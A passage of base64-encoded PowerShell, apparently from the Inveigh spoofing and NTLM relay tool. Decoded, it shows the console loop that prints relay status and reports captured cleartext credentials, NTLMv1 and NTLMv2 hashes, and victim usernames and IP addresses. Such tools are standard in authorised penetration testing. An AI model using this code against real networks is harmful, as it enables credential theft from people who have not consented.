ldygpCiAgICAgICAgfQoKICAgICAgICA6Y29uc29sZV9sb29wIHdoaWxlKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKICAgICAgICB7CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgc3dpdGNoIC13aWxkY2FyZCAoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSkKICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgeyRfIC1saWtlICIqIHdyaXR0ZW4gdG8gKiIgLW9yICRfIC1saWtlICIqIGZvciByZWxheSAqIiAtb3IgJF8gLWxpa2UgIipTTUIgcmVsYXkgKiIgLW9yICRfIC1saWtlICIqIGxvY2FsIGFkbWluaXN0cmF0b3IgKiJ9CiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nKCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHskXyAtbGlrZSAiKiBzcG9vZmVyIGlzIGRpc2FibGVkIiAtb3IgJF8gLWxpa2UgIiogbG9jYWwgcmVxdWVzdCIgLW9yICRfIC1saWtlICIqIGhvc3QgaGVhZGVyICoiIC1vciAkXyAtbGlrZSAiKiB1c2VyIGFnZW50IHJlY2VpdmVkICoifQogICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRDb25zb2xlT3V0cHV0IC1lcSAnWScpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0gKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVBdCgwKQoKICAgICAgICAgICAgICAgICAgICB9IAoKICAgICAgICAgICAgICAgICAgICB7JF8gLWxpa2UgIiogcmVzcG9uc2Ugc2VudCIgLW9yICRfIC1saWtlICIqIGlnbm9yaW5nICoiIC1vciAkXyAtbGlrZSAiKiBIVFRQKnJlcXVlc3QgZm9yICoiIC1vciAkXyAtbGlrZSAiKiBQcm94eSByZXF1ZXN0IGZvciAqIn0KICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRDb25zb2xlT3V0cHV0IC1uZSAiTG93IikKICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCgogICAgICAgICAgICAgICAgICAgIH0gCgogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRDb25zb2xlU3RhdHVzIC1hbmQgJGNvbnNvbGVfc3RhdHVzX3N0b3B3YXRjaC5FbGFwc2VkIC1nZSAkY29uc29sZV9zdGF0dXNfdGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmNsZWFydGV4dF9saXN0LkNvdW50IC1ndCAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBDdXJyZW50IHVuaXF1ZSBjbGVhcnRleHQgY2FwdHVyZXM6IiArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QuU29ydCgpCgogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJHVuaXF1ZV9jbGVhcnRleHQgaW4gJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBpZigkdW5pcXVlX2NsZWFydGV4dCAtbmUgJHVuaXF1ZV9jbGVhcnRleHRfbGFzdCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCR1bmlxdWVfY2xlYXJ0ZXh0ICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJHVuaXF1ZV9jbGVhcnRleHRfbGFzdCA9ICR1bmlxdWVfY2xlYXJ0ZXh0CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIE5vIGNsZWFydGV4dCBjcmVkZW50aWFscyBoYXZlIGJlZW4gY2FwdHVyZWQiICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5OVExNdjFfbGlzdC5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gQ3VycmVudCB1bmlxdWUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBjYXB0dXJlczoiICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfbGlzdC5Tb3J0KCkKCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkdW5pcXVlX05UTE12MSBpbiAkaW52ZWlnaC5OVExNdjFfbGlzdCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICR1bmlxdWVfTlRMTXYxX2FjY291bnQgPSAkdW5pcXVlX05UTE12MS5TdWJTdHJpbmcoMCwkdW5pcXVlX05UTE12MS5JbmRleE9mKCI6IiwoJHVuaXF1ZV9OVExNdjEuSW5kZXhPZigiOiIpICsgMikpKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHVuaXF1ZV9OVExNdjFfYWNjb3VudCAtbmUgJHVuaXF1ZV9OVExNdjFfYWNjb3VudF9sYXN0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJHVuaXF1ZV9OVExNdjEgKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkdW5pcXVlX05UTE12MV9hY2NvdW50X2xhc3QgPSAkdW5pcXVlX05UTE12MV9hY2NvdW50CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkdW5pcXVlX05UTE12MV9hY2NvdW50X2xhc3QgPSAnJwogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1tIDUKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gQ3VycmVudCBOVExNdjEgSVAgYWRkcmVzc2VzIGFuZCB1c2VybmFtZXM6IiArICRpbnZlaWdoLm5ld2xpbmUpCgogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJE5UTE12MV91c2VybmFtZSBpbiAkaW52ZWlnaC5OVExNdjFfdXNlcm5hbWVfbGlzdCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkTlRMTXYxX3VzZXJuYW1lICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1tIDUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTm8gTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBoYXNoZXMgaGF2ZSBiZWVuIGNhcHR1cmVkIiArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guTlRMTXYyX2xpc3QuQ291bnQgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEN1cnJlbnQgdW5pcXVlIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZXM6IiArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2xpc3QuU29ydCgpCgogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJHVuaXF1ZV9OVExNdjIgaW4gJGludmVpZ2guTlRMTXYyX2xpc3QpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkdW5pcXVlX05UTE12Ml9hY2NvdW50ID0gJHVuaXF1ZV9OVExNdjIuU3ViU3RyaW5nKDAsJHVuaXF1ZV9OVExNdjIuSW5kZXhPZigiOiIsKCR1bmlxdWVfTlRMTXYyLkluZGV4T2YoIjoiKSArIDIpKSkKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCR1bmlxdWVfTlRMTXYyX2FjY291bnQgLW5lICR1bmlxdWVfTlRMTXYyX2FjY291bnRfbGFzdCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCR1bmlxdWVfTlRMTXYyICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJHVuaXF1ZV9OVExNdjJfYWNjb3VudF9sYXN0ID0gJHVuaXF1ZV9OVExNdjJfYWNjb3VudAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJHVuaXF1ZV9OVExNdjJfYWNjb3VudF9sYXN0ID0gJycKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEN1cnJlbnQgTlRMTXYyIElQIGFkZHJlc3NlcyBhbmQgdXNlcm5hbWVzOiIgKyAkaW52ZWlnaC5uZXdsaW5lKQoKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCROVExNdjJfdXNlcm5hbWUgaW4gJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJE5UTE12Ml91c2VybmFtZSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIE5vIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgaGFzaGVzIGhhdmUgYmVlbiBjYXB0dXJlZCIgKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRjb25zb2xlX3N0YXR1c19zdG9wd2F0Y2ggPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmNvbnNvbGVfaW5wdXQpCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZihbQ29uc29sZV06OktleUF2YWlsYWJsZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX291dHB1dCA9ICRmYWxzZQogICAgICAgICAgICAgICAgICAgIEJSRUFLIGNvbnNvbGVfbG9vcAogICAgICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgICAgICB9CgogICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgfQoKICAgIH0KCn0KZmluYWxseQp7CgogICAgaWYoJFRvb2wgLWVxIDIpCiAgICB7CiAgICAgICAgJGludmVpZ2gucmVsYXlfcnVubmluZyA9ICRmYWxzZQogICAgfQoKfQoKfQo=
